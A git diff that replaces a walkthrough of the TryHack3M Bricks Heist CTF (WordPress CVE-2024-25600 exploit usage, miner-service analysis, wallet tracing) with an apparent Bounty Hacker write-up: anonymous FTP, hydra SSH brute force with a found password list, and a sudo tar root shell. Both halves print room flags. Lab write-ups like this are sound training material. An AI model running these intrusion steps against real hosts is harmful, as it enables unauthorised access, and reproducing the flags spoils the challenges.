@@ -1,289 +1,223 @@
-# TryHack3M Bricks Heist - CTF Writeup
-
-A comprehensive walkthrough of the TryHack3M Bricks Heist room featuring WordPress exploitation, cryptocurrency mining analysis, and ransomware investigation.
-
-## 📋 Overview
-
-This writeup demonstrates the complete solution path for the TryHack3M Bricks Heist CTF challenge, including:
-- Network enumeration and service discovery
-- WordPress vulnerability exploitation (CVE-2024-25600)
-- System service analysis and process identification
-- Cryptocurrency mining malware investigation
-- Wallet address tracing and threat actor attribution
-
-**Target:** `10.201.6.98`  
-**Theme:** WordPress Bricks theme exploitation leading to RCE
-
----
-
-## 🔍 Enumeration
-
-### Initial Nmap Scan
-```bash
-nmap -A 10.201.6.98
+# Target:10.10.165.84
+First lets run a nmap scan to find the open ports 
 ```
-
-![Nmap Scan Results](Pasted%20image%2020250809180727.png)
-
-The initial scan revealed a WordPress installation with the "Brick by Brick" theme, strongly suggesting this is our primary attack vector given the room name "Brick".
-
-### WordPress Enumeration
-```bash
-wpscan --url https://bricks.thm --disable-tls-checks
-```
-
-Running with TLS-checks won't work due to certificate issues.
-
-![WPScan Results](Pasted%20image%2020250809181711.png)
-
-Here's another reference to "brick" - let's see if this theme has any vulnerability.
-
-Key findings:
-- WordPress site running Bricks theme version 1.9.5
-- TLS checks disabled due to certificate issues
-- Identified potential vulnerability path
-
----
-
-## 💥 Exploitation
-
-### CVE-2024-25600: Bricks WordPress Theme RCE
-
-After researching Bricks theme vulnerabilities for version 1.9.5, we identified **CVE-2024-25600** - a critical Remote Code Execution vulnerability affecting Bricks Builder versions ≤ 1.9.6.
-
-**Vulnerability Details:**
-- **CVE:** CVE-2024-25600
-- **CVSS Score:** 10.0 (Critical)
-- **Type:** Unauthenticated Remote Code Execution
-- **Affected:** Bricks Builder ≤ 1.9.6
-- **Root Cause:** Improper input validation in REST API endpoint
-
-### Exploitation Tool
-
-Using the exploit from: https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
-
-```bash
-python CVE-2024-25600.py --url https://bricks.thm --threads 10
-```
-
-**Required Dependencies:**
-```bash
-pip install alive_progress bs4 prompt_toolkit requests rich
-```
-
-*Note: If installation fails, create a Python virtual environment first.*
-
-### Gaining Shell Access
-
-The exploit successfully provided an interactive shell environment:
-
-![Shell Access](Pasted%20image%2020250809183224.png)
-
-Running the above command gives us a RCE shell.
-
----
-
-## 🎯 Flag Discovery
-
-### First Flag
-```bash
-Shell> ls -la  
-total 260  
-drwxr-xr-x  7 apache apache  4096 Aug  9 12:34 .  
-drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..  
--rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess  
--rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt  
--rw-r--r--  1 apache apache   405 Apr  2  2024 index.php  
-drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod  
--rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt  
-drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin  
--rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html  
--rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php  
-drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin  
--rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php  
--rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php  
--rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php  
--rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php  
-drwxr-xr-x  6 apache apache  4096 Aug  9 12:34 wp-content  
--rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php  
-drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes  
--rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php  
--rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php  
--rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php  
--rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php  
--rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php  
--rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php  
--rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php  
--rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php  
-
-Shell> cat 650c844110baced87e1606453b93f22a.txt  
-THM{fl46_650c844110baced87e1606453b93f22a}
-```
-
-**Flag 1:** `THM{fl46_650c844110baced87e1606453b93f22a}`
-
----
-
-## 🔧 System Analysis
-
-### Service Enumeration
-```bash
-Shell> systemctl | grep running  
- proc-sys-fs-binfmt_misc.automount                loaded active     running         Arbitrary Executable File Formats File System Automount Point                   
- acpid.path                                       loaded active     running         ACPI Events Check                                                               
- init.scope                                       loaded active     running         System and Service Manager                                                      
- session-c1.scope                                 loaded active     running         Session c1 of user lightdm                                                      
- accounts-daemon.service                          loaded active     running         Accounts Service                                                                
- acpid.service                                    loaded active     running         ACPI event daemon                                                               
- atd.service                                      loaded active     running         Deferred execution scheduler                                                    
- avahi-daemon.service                             loaded active     running         Avahi mDNS/DNS-SD Stack                                                         
- cron.service                                     loaded active     running         Regular background program processing daemon                                    
- cups-browsed.service                             loaded active     running         Make remote CUPS printers available locally                                     
- cups.service                                     loaded active     running         CUPS Scheduler                                                                  
- dbus.service                                     loaded active     running         D-Bus System Message Bus                                                        
- getty@tty1.service                               loaded active     running         Getty on tty1                                                                   
- httpd.service                                    loaded active     running         LSB: starts Apache Web Server                                                   
- irqbalance.service                               loaded active     running         irqbalance daemon                                                               
- kerneloops.service                               loaded active     running         Tool to automatically collect and submit kernel crash signatures                
- lightdm.service                                  loaded active     running         Light Display Manager                                                           
- ModemManager.service                             loaded active     running         Modem Manager                                                                   
- multipathd.service                               loaded active     running         Device-Mapper Multipath Device Controller                                       
- mysqld.service                                   loaded active     running         LSB: start and stop MySQL                                                       
- networkd-dispatcher.service                      loaded active     running         Dispatcher daemon for systemd-networkd                                          
- NetworkManager.service                           loaded active     running         Network Manager                                                                 
- polkit.service                                   loaded active     running         Authorization Manager                                                           
- rsyslog.service                                  loaded active     running         System Logging Service                                                          
- rtkit-daemon.service                             loaded active     running         RealtimeKit Scheduling Policy Service                                           
- serial-getty@ttyS0.service                       loaded active     running         Serial Getty on ttyS0                                                           
- snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running         Service for snap application amazon-ssm-agent.amazon-ssm-agent                  
- snapd.service                                    loaded active     running         Snap Daemon                                                                     
- ssh.service                                      loaded active     running         OpenBSD Secure Shell server                                                     
- switcheroo-control.service                       loaded active     running         Switcheroo Control Proxy service                                                
- systemd-journald.service                         loaded active     running         Journal Service                                                                 
- systemd-logind.service                           loaded active     running         Login Service                                                                   
- systemd-networkd.service                         loaded active     running         Network Service                                                                 
- systemd-resolved.service                         loaded active     running         Network Name Resolution                                                         
- systemd-timesyncd.service                        loaded active     running         Network Time Synchronization                                                    
- systemd-udevd.service                            loaded active     running         udev Kernel Device Manager                                                      
- ubuntu.service                                   loaded active     running         TRYHACK3M                                                                       
- udisks2.service                                  loaded active     running         Disk Manager                                                                    
- unattended-upgrades.service                      loaded active     running         Unattended Upgrades Shutdown                                                    
- upower.service                                   loaded active     running         Daemon for power management                                                     
- user@1000.service                                loaded active     running         User Manager for UID 1000                                                       
- user@114.service                                 loaded active     running         User Manager for UID 114                                                        
- whoopsie.service                                 loaded active     running         crash report submission daemon                                                  
- wpa_supplicant.service                           loaded active     running         WPA supplicant                                                                  
- acpid.socket                                     loaded active     running         ACPID Listen Socket                                                             
- avahi-daemon.socket                              loaded active     running         Avahi mDNS/DNS-SD Stack Activation Socket                                       
- cups.socket                                      loaded active     running         CUPS Scheduler                                                                  
- dbus.socket                                      loaded active     running         D-Bus System Message Bus Socket                                                 
- multipathd.socket                                loaded active     running         multipathd control socket                                                       
- snapd.socket                                     loaded active     running         Socket activation for snappy daemon                                             
- syslog.socket                                    loaded active     running         Syslog Socket                                                                   
- systemd-journald-audit.socket                    loaded active     running         Journal Audit Socket                                                            
- systemd-journald-dev-log.socket                  loaded active     running         Journal Socket (/dev/log)                                                       
- systemd-journald.socket                          loaded active     running         Journal Socket                                                                  
- systemd-networkd.socket                          loaded active     running         Network Service Netlink Socket                                                  
- systemd-udevd-control.socket                     loaded active     running         udev Control Socket                                                             
- systemd-udevd-kernel.socket                      loaded active     running         udev Kernel Socket
-```
-
-Among the running services, one stood out as suspicious:
-```
-ubuntu.service    loaded active running    TRYHACK3M
-```
-
-### Service Investigation
-```bash
-Shell> systemctl cat ubuntu.service  
-
-# /etc/systemd/system/ubuntu.service  
-[Unit]  
-Description=TRYHACK3M  
+nmap 10.10.165.84            
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 09:31 IST  
+Nmap scan report for 10.10.165.84  
+Host is up (0.26s latency).  
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)  
+PORT   STATE SERVICE  
+21/tcp open  ftp  
+22/tcp open  ssh  
+80/tcp open  http  
   
-[Service]  
-Type=simple  
-ExecStart=/lib/NetworkManager/nm-inet-dialog  
-Restart=on-failure  
+Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds
+```
+Now lets go visit website
+![image](Pasted%20image%2020250916095151.png)
+no clue lets do a dirctory attack on website 
+```
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://10.  
+10.165.84/FUZZ  
   
-[Install]  
-WantedBy=multi-user.target
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v2.1.0-dev  
+________________________________________________  
+  
+:: Method           : GET  
+:: URL              : http://10.10.165.84/FUZZ  
+:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.  
+txt  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
+________________________________________________  
+  
+images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 432ms]  
+javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 301ms]  
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 250ms]
 ```
-
-**Key Finding:** The service description "TRYHACK3M" and the executable path `/lib/NetworkManager/nm-inet-dialog` indicate this is our target service for the mining instance.
-
----
-
-## 🪙 Cryptocurrency Mining Investigation
-
-### Malware Instance Discovery
-
-The suspicious service points to `/lib/NetworkManager/nm-inet-dialog`. Further investigation of the NetworkManager directory revealed `inet.conf` as the mining configuration file.
-
-![Mining Configuration](Pasted%20image%2020250809194008.png)
-
-Now that we know `inet.conf` is the instance, let's find the associated wallet address.
-
-### Wallet Address Extraction
-
-The configuration file contained an encrypted wallet address. Using string extraction with cryptocurrency address patterns:
-
-```bash
-strings /lib/NetworkManager/inet.conf | grep -E '[13][a-km-zA-HJ-NP-Z1-9]{25,34}|4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}'
+in the time ffuf is running lets visit the ftp 
 ```
-
-![Encrypted Wallet](Pasted%20image%2020250809195524.png)
-
-The wallet address is encrypted, so we have to decode it:
-
-```bash
-echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d30453159556447  
-6130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d | xxd -r -p | base64 -d
+ftp 10.10.165.84                              
+Connected to 10.10.165.84.  
+220 (vsFTPd 3.0.5)  
+Name (10.10.165.84:nobu):    
+530 This FTP server is anonymous only.  
+ftp: Login failed  
+ftp>    
+ftp> exit  
+221 Goodbye.
 ```
+so anonymous login only lets do that
+```
+ftp 10.10.165.84  
+Connected to 10.10.165.84.  
+220 (vsFTPd 3.0.5)  
+Name (10.10.165.84:nobu): anonymous  
+230 Login successful.  
+Remote system type is UNIX.  
+Using binary mode to transfer files.  
+ftp> ls  
+550 Permission denied.  
+200 PORT command successful. Consider using PASV.  
+150 Here comes the directory listing.  
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt  
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt  
+226 Directory send OK.  
+ftp> get task.txt  
+local: task.txt remote: task.txt  
+200 PORT command successful. Consider using PASV.  
+150 Opening BINARY mode data connection for task.txt (68 bytes).  
+100% |*********************************************************|    68      754.61 KiB/s    00:00 ETA  
+226 Transfer complete.  
+68 bytes received in 00:00 (0.21 KiB/s)  
+ftp> get locks.txt  
+local: locks.txt remote: locks.txt  
+200 PORT command successful. Consider using PASV.  
+150 Opening BINARY mode data connection for locks.txt (418 bytes).  
+100% |*********************************************************|   418       23.44 MiB/s    00:00 ETA  
+226 Transfer complete.  
+418 bytes received in 00:00 (1.71 KiB/s)  
+ftp>
+```
+now we have the task to answer the question on tryhackme 
+```
+cat task.txt       
+1.) Protect Vicious.  
+2.) Plan for Red Eye pickup on the moon.  
+  
+-lin
+```
+we also had another file 
+```
+cat locks.txt    
+rEddrAGON  
+ReDdr4g0nSynd!cat3  
+Dr@gOn$yn9icat3  
+R3DDr46ONSYndIC@Te  
+ReddRA60N  
+R3dDrag0nSynd1c4te  
+dRa6oN5YNDiCATE  
+ReDDR4g0n5ynDIc4te  
+R3Dr4gOn2044  
+RedDr4gonSynd1cat3  
+R3dDRaG0Nsynd1c@T3  
+Synd1c4teDr@g0n  
+reddRAg0N  
+REddRaG0N5yNdIc47e  
+Dra6oN$yndIC@t3  
+4L1mi6H71StHeB357  
+rEDdragOn$ynd1c473  
+DrAgoN5ynD1cATE  
+ReDdrag0n$ynd1cate  
+Dr@gOn$yND1C4Te  
+RedDr@gonSyn9ic47e  
+REd$yNdIc47e  
+dr@goN5YNd1c@73  
+rEDdrAGOnSyNDiCat3  
+r3ddr@g0N  
+ReDSynd1ca7e
+```
+seems like a password list also we had a username in the task.txt 
+lets bruteforce ssh with hydra 
+```
+hydra -l lin  -P locks.txt 10.10.165.84 ssh    
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret servi  
+ce organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anywa  
+y).  
+  
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 09:45:06  
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the  
+tasks: use -t 4  
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previou  
+s session found, to prevent overwriting, ./hydra.restore  
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task  
+[DATA] attacking ssh://10.10.165.84:22/  
+[22][ssh] host: 10.10.165.84   login: lin   password: RedDr4gonSynd1cat3  
+1 of 1 target successfully completed, 1 valid password found  
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.  
+[ERROR] 1 target did not resolve or could not be connected  
+[ERROR] 0 target did not complete  
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 09:45:26
+```
+now that we have password lets login with ssh
+```
+ssh lin@10.10.165.84              
+The authenticity of host '10.10.165.84 (10.10.165.84)' can't be established.  
+ED25519 key fingerprint is SHA256:aRXNZbLTGvgOw9ZG78xRshRmIZIWtVj7APfFQ3oaxBc.  
+This key is not known by any other names.  
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
+Warning: Permanently added '10.10.165.84' (ED25519) to the list of known hosts.  
+lin@10.10.165.84's password:    
+Permission denied, please try again.  
+lin@10.10.165.84's password:    
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)  
+  
+* Documentation:  https://help.ubuntu.com  
+* Management:     https://landscape.canonical.com  
+* Support:        https://ubuntu.com/pro  
+  
+Expanded Security Maintenance for Infrastructure is not enabled.  
+  
+0 updates can be applied immediately.  
+  
+Enable ESM Infra to receive additional future security updates.  
+See https://ubuntu.com/esm or run: sudo pro status  
+  
+  
+The list of available updates is more than a week old.  
+To check for new updates run: sudo apt update  
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or  
+proxy settings  
+  
+Your Hardware Enablement Stack (HWE) is supported until April 2025.  
+Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228  
+  
+lin@ip-10-10-165-84:~/Desktop$    
+lin@ip-10-10-165-84:~/Desktop$ ls  
+user.txt  
+lin@ip-10-10-165-84:~/Desktop$ cat user.txt  
+THM{CR1M3_SyNd1C4T3}
 
-It needs to be decrypted again to get the actual wallet ID:
+```
+now we have low privlage but to get root.txt we need root access 
+so lets check for privilage escalation vectors
+```
+sudo -l  
+[sudo] password for lin:    
+Sorry, try again.  
+[sudo] password for lin:    
+Matching Defaults entries for lin on ip-10-10-165-84:  
+   env_reset, mail_badpass,  
+   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+  
+User lin may run the following commands on ip-10-10-165-84:  
+   (root) /bin/tar
+```
+fortunately the first vector i checked itself is leading to root access lets visit gtfobins to get the command to spawn root shell 
+![image](Pasted%20image%2020250916100257.png)
 
-![Decoded Wallet](Pasted%20image%2020250809195850.png)
-
-**Decoded Wallet Address:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
-
-### Blockchain Analysis
-
-Using blockchain explorer (https://www.blockchain.com/explorer), we traced transactions from this wallet to identify the largest recipient:
-
-![Blockchain Analysis](Pasted%20image%2020250809200057.png)
-
-Then we can search for the receiver: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`
-
-### Threat Actor Attribution
-
-Searching this Bitcoin address in Google revealed:
-
-![LockBit Attribution](Pasted%20image%2020250809200252.png)
-
-As we can see, the group is **LockBit** - a notorious ransomware-as-a-service operation.
-
-**Major Recipient:** `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`
-
----
-
-
-## 🎯 Summary of Findings
-
-### Flags Discovered
-- **Flag 1:** `THM{fl46_650c844110baced87e1606453b93f22a}`
-- **Suspicious Service:** `ubuntu.service` (Description: TRYHACK3M)
-- **Mining Instance:** `/lib/NetworkManager/inet.conf`
-- **Wallet Address:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
-- **Threat Actor:** LockBit Ransomware Group
-
-
-## 📝 Key Takeaways
-
-This challenge demonstrates:
-1. **Critical WordPress vulnerabilities** can lead to complete system compromise
-2. **Cryptocurrency mining malware** often masquerades as legitimate system services
-3. **Blockchain analysis** can reveal threat actor attribution and financial infrastructure  
-4. **Systematic enumeration** and analysis are crucial for complex attack chains
-5. **Defense in depth** is essential for preventing and detecting such attacks
-
+now that we have it lets execute it 
+```
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exe  
+c=/bin/sh  
+tar: Removing leading `/' from member names  
+# ls  
+user.txt  
+# find / -type f -name "root.txt" 2>/dev/null  
+/root/root.txt  
+  
+^C  
+# cat /root/root.txt           
+THM{80UN7Y_h4cK3r}
+```
+after executing we have got root access and then we used it to get the root.txt flag
